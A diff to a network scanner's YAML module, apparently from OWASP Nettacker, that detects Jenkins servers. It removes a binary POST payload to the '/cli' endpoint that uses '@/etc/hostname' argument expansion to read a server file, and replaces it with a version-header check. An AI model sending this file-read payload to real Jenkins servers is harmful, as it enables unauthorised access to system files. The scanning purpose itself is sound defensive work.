@@ -31,40 +31,6 @@ payloads:
         ssl: false
         url:
           nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/"
-            prefix: ""
-            suffix: ""
-            interceptors:
-            data:
-              schema:
-                - "http"
-                - "https"
-              ports:
-                - 80
-                - 443
-                - 8080
-                - 8888
-        response:
-          condition_type: and
-          conditions:
-            status_code:
-              regex: "200|302|403"
-              reverse: false
-            headers:
-              X-Jenkins:
-                regex: \d+\.\d+
-                reverse: false
-          log: "response_dependent['headers']['X-Jenkins']"
-
-      - method: post
-        timeout: 5
-        headers:
-          User-Agent: "{user_agent}"
-          Content-Type: "application/octet-stream"
-        allow_redirects: false
-        ssl: false
-        url:
-          nettacker_fuzzer:
             input_format: "{{schema}}://{target}:{{ports}}/cli"
             prefix: ""
             suffix: ""
@@ -78,13 +44,15 @@ payloads:
                 - 443
                 - 8080
                 - 8888
-        data: "\x00\x00\x00\x06\x00\x00\x00help\x00\x00\x00\x02@/etc/hostname\x00\x00\x00\x00\x00"
+                - 50000
         response:
           condition_type: and
           conditions:
             status_code:
               regex: "200"
               reverse: false
-            content:
-              regex: "([\w.\-]+|No such file)"
-              reverse: false
+            headers:
+              X-Jenkins:
+                regex: '[0-9]+\.[0-9]+'
+                reverse: false
+          log: "response_dependent['headers']['X-Jenkins']"
